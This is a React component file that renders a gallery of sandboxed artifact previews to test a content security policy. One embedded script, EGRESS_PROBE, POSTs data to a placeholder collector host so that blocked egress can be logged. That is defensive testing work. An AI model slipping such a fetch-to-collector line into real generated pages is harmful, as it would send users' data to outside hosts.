"use client";

import * as React from "react";
import { SandboxFrame, type ConsoleEntry, type RunStatus } from "@/components/canvas/sandbox-frame";
import { SandboxProfileProvider } from "@/components/canvas/sandbox-document-frame";
import { MermaidBlock } from "@/components/chat/learning/mermaid-block";
import { SharedArtifactViewer } from "@/components/share/shared-artifact-viewer";
import type { ArtifactType } from "@/lib/message-content";

const EGRESS_PROBE = `<script>
document.addEventListener("securitypolicyviolation", function (e) {
  console.warn("refused " + e.effectiveDirective + " " + e.blockedURI);
});
fetch("https://egress.example.invalid/collect", { method: "POST", body: "typed" }).catch(function () {});
</script>`;

// The class names below are ARTIFACT source — they run inside the preview on the
// Tailwind Play CDN, the way a generated page would — not this app's styles.
/* eslint-disable design-system/no-arbitrary-radius, design-system/no-raw-text-size */
const SAMPLES: { name: string; type: ArtifactType; language?: string; content: string }[] = [
  {
    name: "HTML + Tailwind + script",
    type: "HTML",
    content: `<div class="p-6 font-sans"><h1 class="text-2xl font-bold text-indigo-600">Tailwind ran</h1>
<button id="b" class="mt-3 rounded bg-indigo-600 px-3 py-1 text-white">Clicked 0</button>
<img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=200" alt="" class="mt-3 h-16 rounded">
</div>
<script>var n=0;document.getElementById("b").onclick=function(){this.textContent="Clicked "+(++n)};console.log("inline script ran");</script>
${EGRESS_PROBE}`,
  },
  {
    name: "React",
    type: "REACT",
    language: "tsx",
    content: `import { useState } from "react";
export default function Counter() {
  const [n, setN] = useState(0);
  return <div className="p-6"><h1 className="text-xl font-semibold">React ran</h1>
    <button className="mt-2 rounded border px-3 py-1" onClick={() => setN(n + 1)}>Count {n}</button></div>;
}`,
  },
  { name: "SVG", type: "SVG", content: `<svg viewBox="0 0 100 40" width="200"><rect width="100" height="40" rx="6" fill="#6366f1"/><text x="50" y="25" text-anchor="middle" fill="#fff" font-size="12">SVG</text></svg>` },
  { name: "Mermaid artifact", type: "MERMAID", content: "graph LR\n  A[Artifact] --> B[Shell]\n  B --> C[Runs]" },
  { name: "JavaScript console", type: "CODE", language: "javascript", content: `console.log("js ran", [1, 2, 3].map((x) => x * 2));\n42` },
  { name: "Python console", type: "CODE", language: "python", content: `import sys\nprint("python ran", sys.version.split()[0])` },
];
/* eslint-enable design-system/no-arbitrary-radius, design-system/no-raw-text-size */

function Probe({ name, type, language, content }: (typeof SAMPLES)[number]) {
  const [status, setStatus] = React.useState<RunStatus>("idle");
  const [lines, setLines] = React.useState<string[]>([]);
  const onConsole = React.useCallback((e: ConsoleEntry) => setLines((l) => [...l, `${e.level}: ${e.text}`].slice(-8)), []);
  const onStatus = React.useCallback((s: RunStatus) => setStatus(s), []);
  return (
    <section className="flex flex-col gap-2" data-probe={name} data-status={status}>
      <h3 className="text-ui font-medium">
        {name} <span className="font-mono text-caption text-muted-foreground">status: {status}</span>
      </h3>
      <div className="h-48 overflow-hidden rounded-panel border border-border/60">
        <SandboxFrame type={type} language={language} content={content} onConsole={onConsole} onStatus={onStatus} />
      </div>
      <pre className="min-h-10 whitespace-pre-wrap font-mono text-caption text-muted-foreground" data-console>
        {lines.join("\n")}
      </pre>
    </section>
  );
}

export function SandboxGallery() {
  return (
    <main className="mx-auto flex max-w-5xl flex-col gap-10 px-4 py-8">
      <header>
        <h1 className="text-title font-semibold">Artifact previews</h1>
        <p className="text-body text-muted-foreground">
          Every frame below runs inside this page&rsquo;s enforcing CSP. A status of &ldquo;done&rdquo; means the
          preview&rsquo;s own scripts ran.
        </p>
      </header>

      <div className="flex flex-col gap-4">
        <h2 className="text-heading font-semibold">Your previews (private profile)</h2>
        <div className="grid gap-6 sm:grid-cols-2">
          {SAMPLES.map((s) => (
            <Probe key={s.name} {...s} />
          ))}
        </div>
        <h3 className="text-ui font-medium">Inline Mermaid in a chat message</h3>
        <MermaidBlock code={"sequenceDiagram\n  App->>Shell: render\n  Shell-->>App: ready"} />
      </div>

      <SandboxProfileProvider profile="public">
        <div className="flex flex-col gap-4" data-profile="public">
          <h2 className="text-heading font-semibold">Public share (public profile)</h2>
          <div className="grid gap-6 sm:grid-cols-2">
            <Probe {...SAMPLES[0]} name="Public HTML" />
            <Probe {...SAMPLES[1]} name="Public React" />
          </div>
          <div className="flex h-96 flex-col">
            <SharedArtifactViewer type="HTML" content={SAMPLES[0].content} version={2} />
          </div>
          <MermaidBlock code={"graph TD\n  Visitor --> Page"} />
        </div>
      </SandboxProfileProvider>
    </main>
  );
}
